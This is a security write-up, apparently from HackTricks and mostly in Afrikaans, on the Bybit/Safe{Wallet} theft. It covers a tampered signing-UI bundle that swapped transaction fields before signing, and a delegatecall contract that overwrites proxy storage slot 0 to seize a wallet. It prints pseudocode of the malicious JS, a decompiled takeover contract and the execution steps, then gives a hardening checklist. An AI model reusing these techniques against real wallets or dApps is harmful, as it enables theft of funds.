# Web3 Signing Workflow Compromise & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

’n Koue-beursie-diefstalketting het ’n **supply-chain compromise van die Safe{Wallet}-web-UI** gekombineer met ’n **on-chain delegatecall primitive wat ’n proxy se implementation pointer (slot 0) oorskryf**. Die belangrikste gevolgtrekkings is:

- As ’n dApp kode in die signing path kan inject, kan dit ’n signer ’n geldige **EIP-712 signature oor attacker-chosen fields** laat produseer<sup>[[4]](#references)</sup> terwyl die oorspronklike UI-data herstel word sodat ander signers onbewus bly.
- Safe proxies stoor `masterCopy` (implementation) by **storage slot 0**. ’n Delegatecall na ’n contract wat na slot 0 skryf, “upgrade” die Safe effektief na attacker logic, wat volledige beheer oor die wallet gee.

## Off-chain: Targeted signing mutation in Safe{Wallet}

’n Gepeuterde Safe-bundle (`_app-*.js`) het spesifieke Safe + signer addresses selektief aangeval. Die injected logic het direk voor die signing call uitgevoer:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Aanvalseienskappe
- **Context-gated**: hard-coded allowlists vir slagoffer-Safes/signers het geraas voorkom en opsporing verlaag.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: velde (`to`, `data`, `operation`, gas) is onmiddellik voor `signTransaction` oorskryf en daarna teruggestel, sodat proposal payloads in die UI onskadelik gelyk het terwyl signatures met die attacker payload ooreengestem het.
- **EIP-712 opacity**: wallets het gestruktureerde data gewys, maar nie geneste calldata gedekodeer of `operation = delegatecall` uitgelig nie, wat die gemuteerde boodskap effektief blind-signed gemaak het.

### Relevansie van Gateway-validasie
Safe proposals word aan die **Safe Client Gateway** voorgelê.<sup>[[5]](#references)</sup> Voor hardened checks kon die gateway ’n proposal aanvaar waar `safeTxHash`/signature met ander velde ooreengestem het as dié in die JSON body indien die UI dit ná signing herskryf het. Ná die incident verwerp die gateway nou proposals waarvan die hash/signature nie met die voorgelêde transaksie ooreenstem nie. Soortgelyke server-side hash verification behoort op enige signing-orchestration API afgedwing te word.

### 2025 Bybit/Safe-incident: hoogtepunte
- Die Bybit cold-wallet drain van 21 Februarie 2025 (~401k ETH) het dieselfde patroon hergebruik: ’n compromised Safe S3 bundle is slegs vir Bybit signers geaktiveer en het `operation=0` → `1` gewysig, terwyl `to` na ’n pre-deployed attacker contract gewys het wat slot 0 skryf.<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback-gecachede `_app-52c9031bfa03da47.js` wys dat die logika op Bybit se Safe (`0x1db9…cf4`) en signer addresses gebaseer was, waarna dit onmiddellik twee minute ná execution na ’n clean bundle teruggerol is, wat die “mutate → sign → restore”-truuk weerspieël.<sup>[[1]](#references)[[2]](#references)</sup>
- Die malicious contract (byvoorbeeld `0x9622…c7242`) het eenvoudige functions `sweepETH/sweepERC20` plus ’n `transfer(address,uint256)` bevat wat die implementation slot skryf. Execution van `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` het die proxy implementation verander en volle beheer verleen.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies hou `masterCopy` by **storage slot 0** en delegate alle logika daaraan. Omdat Safe **`operation = 1` (delegatecall)** ondersteun, kan enige signed transaction na ’n arbitrary contract wys en die kode daarvan binne die proxy se storage context uitvoer.<sup>[[3]](#references)</sup>

’n Attacker contract het ’n ERC-20 `transfer(address,uint256)` nageboots, maar eerder `_to` in slot 0 geskryf:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Uitvoeringspad:<sup>[[1]](#references)[[3]](#references)</sup>
1. Slagoffers teken `execTransaction` met `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy valideer handtekeninge oor hierdie parameters.
3. Proxy voer `delegatecall` na `attackerContract` uit; die `transfer`-body skryf slot 0.
4. Slot 0 (`masterCopy`) wys nou na aanvaller-beheerde logika → **volledige wallet-oorname en fondsdreinering**.

### Guard- en weergawe-aantekeninge (verharding ná die voorval)
- Safes >= v1.3.0 kan ’n **Guard** installeer om `delegatecall` te veto of ACLs op `to`/selectors af te dwing; Bybit het v1.1.1 gebruik, dus het geen Guard-hook bestaan nie. Die opgradering van kontrakte (en die herbyvoeging van owners) word vereis om hierdie beheervlak te verkry.

## Kontrolelys vir opsporing en verharding

- **UI-integriteit**: pin JS-assets / SRI; monitor bundelverskille; behandel die signing-UI as deel van die trust boundary.
- **Validasie tydens signing**: hardware wallets met **EIP-712 clear-signing**; wys `operation` eksplisiet en decode geneste calldata. Verwerp signing wanneer `operation = 1`, tensy beleid dit toelaat.
- **Server-side hash checks**: gateways/services wat proposals relay, moet `safeTxHash` herbereken en valideer dat handtekeninge met die submitted fields ooreenstem.
- **Beleid/allowlists**: preflight-reëls vir `to`, selectors, asset types, en verbied delegatecall behalwe vir gekeurde flows. Vereis ’n interne policy service voordat volledig ondertekende transactions broadcast word.
- **Contract design**: vermy die blootstelling van arbitrêre delegatecall in multisig/treasury wallets, tensy dit streng noodsaaklik is. Plaas upgrade pointers weg van slot 0 of beskerm dit met eksplisiete upgrade logic en access control.
- **Monitoring**: waarsku oor delegatecall-executions vanaf wallets wat treasury-fondse hou, en oor proposals wat `operation` van tipiese `call`-patrone verander.

## Verwysings

- [1] [AnChain.AI se forensiese ontleding van die Bybit Safe-exploit](https://www.anchain.ai/blog/bybit)
- [2] [Zero Hour Technology se ontleding van die Safe-bundelkompromie](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [In-diepte tegniese ontleding van die Bybit-hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
